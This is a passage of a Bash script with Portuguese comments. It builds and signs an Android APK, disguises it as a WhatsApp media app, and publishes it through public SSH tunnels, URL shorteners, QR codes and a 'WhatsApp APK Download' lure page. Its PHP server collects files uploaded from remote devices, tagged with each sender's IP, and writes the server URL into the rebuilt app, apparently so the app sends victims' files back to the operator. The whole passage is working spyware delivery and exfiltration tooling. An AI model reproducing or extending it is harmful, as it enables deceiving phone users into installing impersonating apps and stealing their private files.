    local short_url=""
    
    # Serviço 1: is.gd (mais confiável)
    printf "\e[1;92m[*] Trying is.gd...\e[0m\n"
    short_url=$(curl -s --max-time 15 "https://is.gd/create.php?format=simple&url=${full_url}")
    if [[ "$short_url" == http* ]] && [[ "$short_url" != *"error"* ]]; then
        printf '\e[1;93m[*] Short URL (is.gd):\e[0m\e[1;77m %s \n' "$short_url"
        echo "Short URL (is.gd): $short_url" >> generated_urls.txt
        return
    fi
    
    # Serviço 2: da.gd
    printf "\e[1;92m[*] Trying da.gd...\e[0m\n"
    short_url=$(curl -s --max-time 15 "https://da.gd/s?url=${full_url}")
    if [[ "$short_url" == http* ]]; then
        printf '\e[1;93m[*] Short URL (da.gd):\e[0m\e[1;77m %s \n' "$short_url"
        echo "Short URL (da.gd): $short_url" >> generated_urls.txt
        return
    fi
    
    # Serviço 3: v.gd
    printf "\e[1;92m[*] Trying v.gd...\e[0m\n"
    short_url=$(curl -s --max-time 15 "https://v.gd/create.php?format=simple&url=${full_url}")
    if [[ "$short_url" == http* ]]; then
        printf '\e[1;93m[*] Short URL (v.gd):\e[0m\e[1;77m %s \n' "$short_url"
        echo "Short URL (v.gd): $short_url" >> generated_urls.txt
        return
    fi
    
    # Serviço 4: tinyurl com método alternativo
    printf "\e[1;92m[*] Trying TinyURL (alternative method)...\e[0m\n"
    short_url=$(curl -s --max-time 15 -X POST -d "url=${full_url}" "http://tinyurl.com/api-create.php")
    if [[ "$short_url" == http* ]]; then
        printf '\e[1;93m[*] TinyURL (alternative):\e[0m\e[1;77m %s \n' "$short_url"
        echo "TinyURL (alternative): $short_url" >> generated_urls.txt
        return
    fi
    
    # Serviço 5: t.ly (novo serviço)
    printf "\e[1;92m[*] Trying t.ly...\e[0m\n"
    short_url=$(curl -s --max-time 15 -X POST -H "Content-Type: application/json" -d "{\"url\":\"${full_url}\"}" "https://t.ly/api/v1/link/shorten")
    if [[ "$short_url" == *'"short_url":"'* ]]; then
        short_url=$(echo "$short_url" | grep -o '"short_url":"[^"]*' | cut -d'"' -f4)
        if [[ "$short_url" == http* ]]; then
            printf '\e[1;93m[*] Short URL (t.ly):\e[0m\e[1;77m %s \n' "$short_url"
            echo "Short URL (t.ly): $short_url" >> generated_urls.txt
            return
        fi
    fi
    
    # Se todos os serviços falharem, criar QR Code como alternativa
    printf '\e[1;91m[!] All URL shorteners failed\e[0m\n'
    printf '\e[1;92m[*] Direct URL:\e[0m\e[1;77m %s/app.apk \n' "$url"
    create_qr_code "$full_url"
}

create_qr_code() {
    local url="$1"
    printf "\e[1;92m[*] Creating QR Code as alternative...\e[0m\n"
    
    # Usar serviço de QR Code online
    local qr_url="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${url}"
    
    printf '\e[1;92m[*] QR Code URL:\e[0m\e[1;77m %s \n' "$qr_url"
    echo "QR Code: $qr_url" >> generated_urls.txt
    
    # Também tentar salvar localmente se possível
    if command -v qrencode > /dev/null 2>&1; then
        qrencode -o qr_code.png "$url"
        printf '\e[1;92m[*] QR Code saved as qr_code.png\e[0m\n'
    fi
}

# Função melhorada para localhost.run
start_localhost_run() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting localhost.run (this may take 15-30 seconds)...\e[0m\n"
    
    # Limpar arquivos anteriores
    rm -f localhost_output.txt localhost_run.log
    
    # Executar localhost.run em background e capturar output
    ssh -o StrictHostKeyChecking=no -R 80:localhost:3333 nokey@localhost.run > localhost_output.txt 2>&1 &
    localhost_pid=$!
    
    # Aguardar mais tempo para URL aparecer
    local max_wait=45
    local wait_count=0
    localhost_url=""
    
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for localhost.run URL...\e[0m\n"
    
    while [ $wait_count -lt $max_wait ] && [ -z "$localhost_url" ]; do
        sleep 3
        ((wait_count+=3))
        
        # Múltiplos padrões de regex para capturar URL do localhost.run
        if [ -f localhost_output.txt ]; then
            # Padrão 1: URL com .lhr.life
            localhost_url=$(grep -oE "https://[a-zA-Z0-9.-]+\.lhr\.life" localhost_output.txt | head -1)
            
            # Padrão 2: URL com .lhr.run  
            if [ -z "$localhost_url" ]; then
                localhost_url=$(grep -oE "https://[a-zA-Z0-9.-]+\.lhr\.run" localhost_output.txt | head -1)
            fi
            
            # Padrão 3: URL genérica do localhost.run
            if [ -z "$localhost_url" ]; then
                localhost_url=$(grep -oE "https://[a-zA-Z0-9.-]+\.[a-z]+\.[a-z]+" localhost_output.txt | grep -v "localhost.run" | head -1)
            fi
            
            # Padrão 4: Procurar por "your url is:" pattern
            if [ -z "$localhost_url" ]; then
                localhost_url=$(grep -oE "your url is:[[:space:]]*(https://[^[:space:]]+)" localhost_output.txt | cut -d' ' -f4)
            fi
        fi
        
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting... (%d/%d seconds)\e[0m\n" "$wait_count" "$max_wait"
    done
    
    if [ -n "$localhost_url" ]; then
        printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] localhost.run URL:\e[0m\e[1;77m %s \n' "$localhost_url"
        
        # Validar URL antes de criar short URL
        if [[ "$localhost_url" == https://* ]]; then
            # APK URL completa
            localhost_apk_url="${localhost_url}/app.apk"
            
            # Usar a mesma função de encurtamento do Serveo
            create_serveo_tinyurl "$localhost_url"
        else
            printf '\e[1;91m[!] Invalid URL format: %s\n' "$localhost_url"
        fi
        
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] localhost.run running (PID: %d)\e[0m\n" "$localhost_pid"
        return 0
    else
        printf "\e[1;91m[!] localhost.run failed - no URL after %d seconds\e[0m\n" "$max_wait"
        if [ -f localhost_output.txt ]; then
            printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Last 15 lines of output:\e[0m\n"
            tail -15 localhost_output.txt
        fi
        kill $localhost_pid 2>/dev/null
        return 1
    fi
}

# Função para criar arquivo HTML com links
create_link_page() {
    local serveo_url="$1"
    local localhost_url="$2"
    
    cat > links.html << EOF
<html>
<head>
    <title>WhatsApp APK Download</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .link { margin: 10px 0; padding: 10px; background: #f0f0f0; }
        .qr { margin: 20px 0; }
    </style>
</head>
<body>
    <h1>WhatsApp APK Download Links</h1>
    
    <div class="link">
        <h3>Serveo.net:</h3>
        <a href="${serveo_url}/app.apk">${serveo_url}/app.apk</a>
    </div>
    
    <div class="link">
        <h3>Localhost.run:</h3>
        <a href="${localhost_url}/app.apk">${localhost_url}/app.apk</a>
    </div>
    
    <div class="qr">
        <h3>QR Code for Mobile:</h3>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${serveo_url}/app.apk" alt="QR Code">
    </div>
</body>
</html>
EOF
    
    printf '\e[1;92m[*] Links page created: links.html\e[0m\n'
}
# Função para criar servidor de upload separado
create_upload_server() {
    printf "\e[1;92m[*] Setting up upload server on port 4444...\e[0m\n"
    
    # Criar script PHP de upload
    create_upload_php
    
    # Iniciar servidor PHP para uploads
    php -S "0.0.0.0:4444" > /dev/null 2>&1 &
    echo $! > php_upload.pid
    printf "\e[1;92m[*] Upload server started on port 4444\e[0m\n"
}
# Função para criar servidor com logging melhorado
setup_single_port_server() {
    printf "\e[1;92m[*] Setting up server with enhanced logging...\e[0m\n"
    
    # Criar script PHP combinado (APK + Upload) com melhor logging
    cat > index.php << 'EOF'
<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Log todas as requisições
$log_data = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'] . " - " . $_SERVER['REQUEST_METHOD'] . " " . $_SERVER['REQUEST_URI'] . "\n";
file_put_contents('access.log', $log_data, FILE_APPEND);

$request_uri = $_SERVER['REQUEST_URI'];

// Servir APK
if ($request_uri === '/app.apk' || $request_uri === '/') {
    if (file_exists('app.apk')) {
        header('Content-Type: application/vnd.android.package-archive');
        header('Content-Disposition: attachment; filename="WhatsApp_Media.apk"');
        header('Content-Length: ' . filesize('app.apk'));
        readfile('app.apk');
        exit;
    } else {
        http_response_code(404);
        echo "APK not found";
        exit;
    }
}

// Upload de arquivos
if ($request_uri === '/upload_files.php') {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $uploadDir = 'uploadedfiles/';
        
        if (!file_exists($uploadDir)) {
            mkdir($uploadDir, 0777, true);
        }
        
        if (isset($_FILES['uploadedfile'])) {
            $file = $_FILES['uploadedfile'];
            $fileName = basename($file['name']);
            $fileSize = $file['size'];
            
            // Adicionar timestamp e IP para evitar sobrescrever
            $fileInfo = pathinfo($fileName);
            $timestamp = time();
            $client_ip = $_SERVER['REMOTE_ADDR'];
            $newFileName = $fileInfo['filename'] . '_' . $client_ip . '_' . $timestamp . '.' . $fileInfo['extension'];
            $filePath = $uploadDir . $newFileName;
            
            if (move_uploaded_file($file['tmp_name'], $filePath)) {
                $upload_log = date('Y-m-d H:i:s') . " - " . $client_ip . " - " . $newFileName . " (" . $fileSize . " bytes)\n";
                file_put_contents('upload.log', $upload_log, FILE_APPEND);
                file_put_contents('Log.log', "UPLOAD_SUCCESS:" . $newFileName . "\n", FILE_APPEND);
                echo "SUCCESS:" . $newFileName;
                
                // Log adicional no console
                error_log("📥 FILE UPLOADED: " . $newFileName . " (" . $fileSize . " bytes) from " . $client_ip);
            } else {
                $error_log = date('Y-m-d H:i:s') . " - UPLOAD_FAILED: " . $fileName . " from " . $client_ip . "\n";
                file_put_contents('error.log', $error_log, FILE_APPEND);
                http_response_code(500);
                echo "ERROR:Upload failed - move_uploaded_file error";
            }
        } else {
            http_response_code(400);
            echo "ERROR:No file uploaded or wrong form field name";
        }
    } else {
        http_response_code(405);
        echo "ERROR:Method not allowed - use POST";
    }
    exit;
}

// Página de status com uploads recentes
if ($request_uri === '/status') {
    header('Content-Type: text/plain');
    echo "WhatsApp Server Status\n";
    echo "Server Time: " . date('Y-m-d H:i:s') . "\n";
    echo "Upload Directory: " . (file_exists('uploadedfiles/') ? 'EXISTS' : 'MISSING') . "\n";
    echo "APK File: " . (file_exists('app.apk') ? 'EXISTS (' . filesize('app.apk') . ' bytes)' : 'MISSING') . "\n\n";
    
    if (file_exists('upload.log')) {
        $lines = file('upload.log');
        $total_uploads = count($lines);
        echo "Total Uploads: " . $total_uploads . "\n";
        echo "Recent uploads (last 20):\n";
        $recent = array_slice($lines, -20);
        echo implode('', $recent);
    } else {
        echo "No uploads yet.\n";
    }
    exit;
}

// Default - mostrar informações
echo "WhatsApp Media Server\n\n";
echo "Available Endpoints:\n";
echo "- GET /app.apk - Download APK\n";
echo "- POST /upload_files.php - Upload files (field: uploadedfile)\n";
echo "- GET /status - Server status\n";
echo "- Logs: access.log, upload.log, error.log\n";
?>
EOF

    printf "\e[1;92m[*] Enhanced server configured on port 3333\e[0m\n"
}
# Função para configurar túnel de upload separado
setup_upload_tunnel() {
    local primary_url="$1"
    printf "\e[1;92m[*] Setting up upload tunnel...\e[0m\n"
    
    # Extrair domínio base da URL primária
    local domain=$(echo "$primary_url" | sed -E 's|https?://([^/]+).*|\1|')
    
    # Tentar criar túnel separado na porta 4444
    printf "\e[1;92m[*] Creating upload tunnel on port 4444...\e[0m\n"
    
    # Método 1: Tentar com Serveo na porta 4444
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 4444:localhost:4444 serveo.net 2>&1 | tee serveo_upload_output' &
    serveo_upload_pid=$!
    sleep 8
    
    local upload_url=""
    if [ -f serveo_upload_output ]; then
        upload_url=$(grep -o "https://[0-9a-z-]*\.serveo\.net" serveo_upload_output | head -1)
        if [ -n "$upload_url" ]; then
            printf "\e[1;92m[*] Upload tunnel: %s:4444\e[0m\n" "$upload_url"
            echo "$upload_url:4444" > upload_url.txt
            return 0
        fi
    fi
    
    # Método 2: Usar localhost.run para upload
    printf "\e[1;92m[*] Trying localhost.run for upload...\e[0m\n"
    ssh -o StrictHostKeyChecking=no -R 4444:localhost:4444 nokey@localhost.run > localhost_upload_output 2>&1 &
    localhost_upload_pid=$!
    sleep 10
    
    if [ -f localhost_upload_output ]; then
        upload_url=$(grep -oE "https://[a-zA-Z0-9.-]+\.lhr\.life" localhost_upload_output | head -1)
        if [ -n "$upload_url" ]; then
            printf "\e[1;92m[*] Upload tunnel: %s:4444\e[0m\n" "$upload_url"
            echo "$upload_url:4444" > upload_url.txt
            return 0
        fi
    fi
    
    # Método 3: Usar IP local
    local local_ip=$(hostname -I | awk '{print $1}')
    printf "\e[1;92m[*] Using local IP for upload: %s:4444\e[0m\n" "$local_ip"
    echo "http://$local_ip:4444" > upload_url.txt
    return 0
}
# Adicione esta função ao seu script (antes da função server)
setup_debug_server() {
    printf "\e[1;92m[*] Setting up debug server...\e[0m\n"
    
    cat > index.php << 'EOF'
<?php
// Ativar logging detalhado
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Log detalhado de todas as requisições
$log_entry = date('Y-m-d H:i:s') . " - IP: " . $_SERVER['REMOTE_ADDR'] . 
             " - Method: " . $_SERVER['REQUEST_METHOD'] . 
             " - URL: " . $_SERVER['REQUEST_URI'] . "\n";
file_put_contents('debug.log', $log_entry, FILE_APPEND);

error_log("📥 REQUEST: " . $_SERVER['REQUEST_METHOD'] . " " . $_SERVER['REQUEST_URI']);

$request_uri = $_SERVER['REQUEST_URI'];

// Servir APK
if ($request_uri === '/app.apk' || $request_uri === '/') {
    error_log("📦 Serving APK file");
    if (file_exists('app.apk')) {
        header('Content-Type: application/vnd.android.package-archive');
        header('Content-Disposition: attachment; filename="WhatsApp_Media.apk"');
        header('Content-Length: ' . filesize('app.apk'));
        readfile('app.apk');
        exit;
    } else {
        error_log("❌ APK file not found");
        http_response_code(404);
        echo "APK not found";
        exit;
    }
}

// Upload de arquivos
if ($request_uri === '/upload_files.php') {
    error_log("⬆️ Upload request received");
    
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        exit;
    }
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        error_log("📨 FILES data: " . print_r($_FILES, true));
        
        $uploadDir = 'uploadedfiles/';
        
        if (!file_exists($uploadDir)) {
            error_log("📁 Creating upload directory");
            mkdir($uploadDir, 0777, true);
        }
        
        if (isset($_FILES['uploadedfile'])) {
            $file = $_FILES['uploadedfile'];
            $fileName = basename($file['name']);
            $fileSize = $file['size'];
            $error = $file['error'];
            
            error_log("📄 File info: " . $fileName . " (" . $fileSize . " bytes) - Error: " . $error);
            
            if ($error === UPLOAD_ERR_OK) {
                $fileInfo = pathinfo($fileName);
                $timestamp = time();
                $client_ip = $_SERVER['REMOTE_ADDR'];
                $newFileName = $fileInfo['filename'] . '_' . $client_ip . '_' . $timestamp . '.' . $fileInfo['extension'];
                $filePath = $uploadDir . $newFileName;
                
                error_log("💾 Saving file to: " . $filePath);
                
                if (move_uploaded_file($file['tmp_name'], $filePath)) {
                    $upload_log = date('Y-m-d H:i:s') . " - SUCCESS - " . $client_ip . " - " . $newFileName . " (" . $fileSize . " bytes)\n";
                    file_put_contents('upload.log', $upload_log, FILE_APPEND);
                    
                    error_log("✅ FILE UPLOAD SUCCESS: " . $newFileName . " (" . $fileSize . " bytes)");
                    
                    echo "SUCCESS:" . $newFileName;
                } else {
                    $error_msg = "move_uploaded_file failed";
                    error_log("❌ UPLOAD FAILED: " . $error_msg);
                    file_put_contents('error.log', date('Y-m-d H:i:s') . " - " . $error_msg . "\n", FILE_APPEND);
                    http_response_code(500);
                    echo "ERROR:" . $error_msg;
                }
            } else {
                $error_msg = "Upload error code: " . $error;
                error_log("❌ UPLOAD ERROR: " . $error_msg);
                http_response_code(500);
                echo "ERROR:" . $error_msg;
            }
        } else {
            $error_msg = "No file uploaded";
            error_log("❌ UPLOAD ERROR: " . $error_msg);
            http_response_code(400);
            echo "ERROR:" . $error_msg;
        }
    } else {
        http_response_code(405);
        echo "ERROR:Method not allowed";
    }
    exit;
}

// Página de status
if ($request_uri === '/status') {
    header('Content-Type: text/plain');
    echo "WhatsApp Server Debug Status\n";
    echo "Server Time: " . date('Y-m-d H:i:s') . "\n";
    echo "Upload Directory: " . (file_exists('uploadedfiles/') ? 'EXISTS' : 'MISSING') . "\n";
    echo "APK File: " . (file_exists('app.apk') ? 'EXISTS (' . filesize('app.apk') . ' bytes)' : 'MISSING') . "\n\n";
    
    if (file_exists('debug.log')) {
        $lines = file('debug.log');
        echo "Recent Requests (last 10):\n";
        $recent = array_slice($lines, -10);
        echo implode('', $recent);
    }
    
    if (file_exists('upload.log')) {
        $lines = file('upload.log');
        echo "Total Uploads: " . count($lines) . "\n";
        echo "Recent uploads:\n";
        $recent = array_slice($lines, -10);
        echo implode('', $recent);
    }
    exit;
}

echo "WhatsApp Media Debug Server\n";
echo "Check /status for information\n";
?>
EOF

    printf "\e[1;92m[*] Debug server configured\e[0m\n"
}


# Função para obter IP real da rede
get_network_info() {
    printf "\e[1;92m[*] Detecting network configuration...\e[0m\n"
    
    # Obter IP local
    local_ip=$(hostname -I | awk '{print $1}')
    printf "\e[1;92m[*] Your local IP: %s\e[0m\n" "$local_ip"
    
    # Obter IP público (opcional)
    public_ip=$(curl -s ifconfig.me)
    printf "\e[1;92m[*] Your public IP: %s\e[0m\n" "$public_ip"
    
    # Testar conectividade
    printf "\e[1;92m[*] Testing local server...\e[0m\n"
    if curl -s "http://$local_ip:3333/status" > /dev/null 2>&1; then
        printf "\e[1;92m[✓] Server accessible via local IP\e[0m\n"
    else
        printf "\e[1;91m[!] Server NOT accessible via local IP\e[0m\n"
    fi
}

# Função para configurar servidor local apenas
setup_local_server() {
    printf "\e[1;92m[*] Setting up LOCAL server configuration...\e[0m\n"
    
    local_ip=$(hostname -I | awk '{print $1}')
    final_url="http://$local_ip:3333"
    
    printf "\e[1;92m[*] Using local URL: %s\e[0m\n" "$final_url"
    
    # Criar arquivo com a URL local
    echo "$final_url" > local_url.txt
    
    return "$final_url"
}
# Função para diagnosticar problemas de túnel
diagnose_tunnel() {
    printf "\e[1;92m[*] Diagnosing tunnel issues...\e[0m\n"
    
    # Verificar se SSH está funcionando
    if pgrep ssh > /dev/null; then
        printf "\e[1;92m[✓] SSH tunnel is running\e[0m\n"
    else
        printf "\e[1;91m[!] SSH tunnel is NOT running\e[0m\n"
    fi
    
    # Verificar se as portas estão sendo usadas
    printf "\e[1;92m[*] Checking port usage...\e[0m\n"
    netstat -tulpn 2>/dev/null | grep :3333 || echo "Port 3333 not in use"
    netstat -tulpn 2>/dev/null | grep :4444 || echo "Port 4444 not in use"
    
    # Verificar processos PHP
    if pgrep php > /dev/null; then
        printf "\e[1;92m[✓] PHP server is running\e[0m\n"
    else
        printf "\e[1;91m[!] PHP server is NOT running\e[0m\n"
    fi
}

# Função para configurar túnel robusto
setup_robust_tunnel() {
    local local_port="$1"
    printf "\e[1;92m[*] Setting up robust tunnel on port %s...\e[0m\n" "$local_port"
    
    # Parar túneis existentes
    pkill -f "serveo.net" 2>/dev/null
    pkill -f "localhost.run" 2>/dev/null
    sleep 2
    
    # Tentar Serveo primeiro
    printf "\e[1;92m[*] Starting Serveo tunnel...\e[0m\n"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -R 80:localhost:$local_port serveo.net 2>&1 | tee serveo_debug.log &
    serveo_pid=$!
    
    # Aguardar mais tempo para estabilização
    sleep 15
    
    # Verificar se Serveo funcionou
    if [ -f serveo_debug.log ] && grep -q "https://" serveo_debug.log; then
        serveo_url=$(grep -o "https://[0-9a-z-]*\.serveo\.net" serveo_debug.log | head -1)
        if [ -n "$serveo_url" ]; then
            printf "\e[1;92m[✓] Serveo tunnel established: %s\e[0m\n" "$serveo_url"
            echo "$serveo_url" > tunnel_url.txt
            return 0
        fi
    fi
    
    printf "\e[1;91m[!] Serveo failed, trying localhost.run...\e[0m\n"
    
    # Tentar localhost.run
    ssh -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R 80:localhost:$local_port nokey@localhost.run 2>&1 | tee localhost_debug.log &
    localhost_pid=$!
    
    sleep 15
    
    # Verificar se localhost.run funcionou
    if [ -f localhost_debug.log ]; then
        localhost_url=$(grep -oE "https://[a-zA-Z0-9.-]+\.lhr\.life" localhost_debug.log | head -1)
        if [ -z "$localhost_url" ]; then
            localhost_url=$(grep -oE "https://[a-zA-Z0-9.-]+\.[a-z]+\.[a-z]+" localhost_debug.log | grep -v "localhost.run" | head -1)
        fi
        
        if [ -n "$localhost_url" ]; then
            printf "\e[1;92m[✓] Localhost.run tunnel established: %s\e[0m\n" "$localhost_url"
            echo "$localhost_url" > tunnel_url.txt
            return 0
        fi
    fi
    
    printf "\e[1;91m[!] All tunnel methods failed\e[0m\n"
    return 1
}
server() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting PUBLIC server mode...\e[0m\n"

    # Diagnóstico inicial
    diagnose_tunnel

    # Criar diretório para uploads
    if [ ! -d uploadedfiles/ ]; then
        mkdir uploadedfiles/
        printf "\e[1;92m[*] Created uploadedfiles/ directory\e[0m\n"
    fi
    
    # Configurar servidor
    setup_debug_server

    # Garantir que o APK está acessível
    if [ ! -f app.apk ]; then
        printf "\e[1;91m[!] APK não encontrado! Procurando...\e[0m\n"
        find . -name "*.apk" -type f | head -1 | while read apk; do
            cp "$apk" app.apk
            printf "\e[1;92m[!] APK copiado de: %s\e[0m\n" "$apk"
        done
    fi

    # Parar servidores existentes
    printf "\e[1;92m[*] Stopping existing servers...\e[0m\n"
    pkill -f "php -S" 2>/dev/null
    sleep 2

    # Iniciar servidor PHP local
    printf "\e[1;92m[*] Starting PHP server on port 3333...\e[0m\n"
    php -S "localhost:3333" > php_server.log 2>&1 &
    php_pid=$!
    echo $php_pid > php_server.pid
    sleep 3

    # Verificar se servidor PHP está rodando
    if curl -s http://localhost:3333/status > /dev/null; then
        printf "\e[1;92m[✓] PHP server is running locally\e[0m\n"
    else
        printf "\e[1;91m[!] PHP server failed to start\e[0m\n"
        cat php_server.log
        return 1
    fi

    # Configurar túnel ROBUSTO
    printf "\e[1;92m[*] Setting up PUBLIC tunnel...\e[0m\n"
    if setup_robust_tunnel 3333; then
        tunnel_url=$(cat tunnel_url.txt)
        final_url="$tunnel_url"
        
        printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] === PUBLIC SERVER READY ===\e[0m\n'
        printf '\e[1;93m[*] Public URL:\e[0m\e[1;77m %s \n' "$final_url"
        printf '\e[1;93m[*] APK Download:\e[0m\e[1;77m %s/app.apk \n' "$final_url"
        printf '\e[1;93m[*] Upload Endpoint:\e[0m\e[1;77m %s/upload_files.php \n' "$final_url"
        
        # Criar short URL
        create_serveo_tinyurl "$final_url"
    else
        printf "\e[1;91m[!] Failed to establish public tunnel\e[0m\n"
        printf "\e[1;92m[*] Falling back to local mode...\e[0m\n"
        local_ip=$(hostname -I | awk '{print $1}')
        final_url="http://$local_ip:3333"
        printf '\e[1;93m[*] Local URL:\e[0m\e[1;77m %s \n' "$final_url"
    fi

    # Atualizar app com a URL FINAL
    printf "\e[1;92m[*] Updating app with URL: %s\e[0m\n" "$final_url"
    update_app_url "$final_url"
    rebuild_app

    printf "\n\e[1;93m=== SERVER INFORMATION ===\e[0m\n"
    printf "\e[1;92m[*] Server URL: %s\e[0m\n" "$final_url"
    printf "\e[1;92m[*] APK: %s/app.apk\e[0m\n" "$final_url"
    printf "\e[1;92m[*] Status: %s/status\e[0m\n" "$final_url"
    printf "\e[1;92m[*] Uploads will be saved in: uploadedfiles/\e[0m\n"
    printf "\e[1;92m[*] Monitor logs: tail -f debug.log\e[0m\n"
    printf "\e[1;92m[*] Press Ctrl+C to exit\e[0m\n"

    # Monitoramento em tempo real
    checkimg
}
checkapk() {
    if [[ -e app/app/build/outputs/apk/release/app-release-unsigned.apk ]]; then
        printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

        # Create keystore if not exists
        if [[ ! -e key.keystore ]]; then
            printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Creating keystore...\e[0m\n"
            keytool -genkey -v -keystore key.keystore -alias androidkey -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname "CN=, OU=, O=, L=, S=, C=" 2>/dev/null
        fi

        cp app/app/build/outputs/apk/release/app-release-unsigned.apk app.apk
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Signing APK...\e[0m\n"
        apksigner sign --ks key.keystore --ks-pass pass:android app.apk > /dev/null 2>&1

        printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/app.apk \e[0m\n"
    else
        printf "\e[1;93m[!] APK not found. Build may have failed.\e[0m\n"
        # Try to find any APK file
        find app/ -name "*.apk" 2>/dev/null | head -1 | while read apk; do
            printf "\e[1;92m[!] Found APK: %s\e[0m\n" "$apk"
            cp "$apk" app.apk
        done
    fi
    
    default_start_server="Y"
    read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
    start_server="${start_server:-${default_start_server}}"
    if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then
        server
    else
        exit 1
    fi
}

build() {
    default_start_build="Y"
    read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
    start_build="${start_build:-${default_start_build}}"
    if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
        cd app/
        
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Gradle Wrapper...\e[0m\n"
        
        # Verificar Java version
        java_version=$(java -version 2>&1 | head -n 1 | cut -d '"' -f 2 | cut -d '.' -f 1)
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Java version: %s\e[0m\n" "$java_version"
        
        # Verificar wrapper files
        if [[ ! -f "gradlew" ]]; then
            printf "\e[1;91m[!] gradlew not found!\e[0m\n"
            cd ..
            return 1
        fi
        
        if [[ ! -f "gradle/wrapper/gradle-wrapper.jar" ]]; then
            printf "\e[1;91m[!] gradle-wrapper.jar not found!\e[0m\n"
            cd ..
            return 1
        fi
        
        chmod +x gradlew
        
        # Test Gradle Wrapper first
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Testing Gradle Wrapper...\e[0m\n"
        if ! ./gradlew --version; then
            printf "\e[1;91m[!] Gradle Wrapper test failed!\e[0m\n"
            cd ..
            return 1
        fi
        
        # Clean com parâmetros otimizados
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cleaning project...\e[0m\n"
        ./gradlew clean --no-daemon -Dorg.gradle.jvmargs="-Xmx2g -Xss512k"
        
        # Build com configurações otimizadas
        printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting optimized build process...\e[0m\n"
        ./gradlew :app:assembleRelease \
            --no-daemon \
            --configure-on-demand \
            --parallel \
            -Dorg.gradle.jvmargs="-Xmx2g -Xss512k -Dfile.encoding=UTF-8" \
            -Dorg.gradle.parallel=true \
            -Dorg.gradle.daemon=false
        
        cd ..
        checkapk
    else
        exit 1
    fi
}

create_launcher_icons() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Criando ícones do launcher (estrutura correta)...\e[0m\n"
    
    # Criar diretórios mipmap para versões antigas (APENAS PNGs tradicionais)
    mkdir -p app/app/src/main/res/mipmap-hdpi
    mkdir -p app/app/src/main/res/mipmap-mdpi
    mkdir -p app/app/src/main/res/mipmap-xhdpi
    mkdir -p app/app/src/main/res/mipmap-xxhdpi
    mkdir -p app/app/src/main/res/mipmap-xxxhdpi
    
    # ---> ATENÇÃO: NÃO crie ic_launcher.xml ou ic_launcher_round.xml nessas pastas acima <---
    
    # Criar diretório específico para ícones adaptativos (API 26+)
    mkdir -p app/app/src/main/res/mipmap-anydpi-v26

    # AGORA, crie os ícones adaptativos APENAS na pasta v26
    cat > app/app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@color/ic_launcher_background"/>
    <foreground android:drawable="@drawable/ic_launcher_foreground"/>
</adaptive-icon>
EOF

    cat > app/app/src/main/res/mipmap-anydpi-v26/ic_launcher_round.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@color/ic_launcher_background"/>
    <foreground android:drawable="@drawable/ic_launcher_foreground"/>
</adaptive-icon>
EOF

    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ícones do launcher criados com a estrutura correta!\e[0m\n"
}

port_conn() {
    default_port=$(seq 1111 4444 | sort -R | head -n1)
    printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
    read port
    port="${port:-${default_port}}"
}

fix_androidx_issue() {
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando ambiente AndroidX otimizado...\e[0m\n"
    
    # Configuração otimizada para evitar StackOverflow
    cat > app/gradle.properties << 'EOF'
